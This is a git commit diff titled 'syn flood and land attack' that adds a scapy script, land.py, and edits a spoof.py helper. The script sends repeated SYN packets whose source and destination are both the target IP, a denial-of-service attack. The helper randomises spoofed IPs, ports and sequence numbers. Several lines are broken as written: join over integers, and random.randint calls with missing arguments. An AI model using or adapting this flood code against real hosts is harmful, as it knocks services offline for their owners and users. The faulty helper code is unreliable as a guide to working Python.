72e1e9570cdbb71c1c2948851823ecb4e3e50faf
Selin Özdaş <ozdasselin@gmail.com>
2019-05-14 22:17:53 +0300

    syn flood and land attack

---
+++ land.py
@@ -0,0 +1,17 @@
+import scapy.all as sc
+import os
+import sys
+from spoof import *
+
+def syn_flood(dst_ip,dst_port):
+    for i in range(500):
+        pck = sc.IP()
+        pck.src = dst_ip
+        pck.dst = dst_ip
+
+        tcp = sc.TCP()
+        tcp.sport,tcp.seq,tcp.window = random_src()
+        tcp.dport = dst_port
+        tcp.flags = "S"
+        
+        sc.send(pck/tcp, verbose=0)
--- spoof.py
+++ spoof.py
@@ -1,5 +1,14 @@
 import random
 def ip_spoof():
-    ip_int = [str(random.randint(0,255)) for i in range(4)]
+    ip_int = [random.randint(0,255) for i in range(4)]
     ip = '.'.join(ip_int)
     return ip
+
+def random_src():
+    src_port = random.randint(1000,9999)
+    src_seq = random.randint()
+    src_window  = random.randint(1000)
+    return src_port,src_seq,src_window
+
+
+
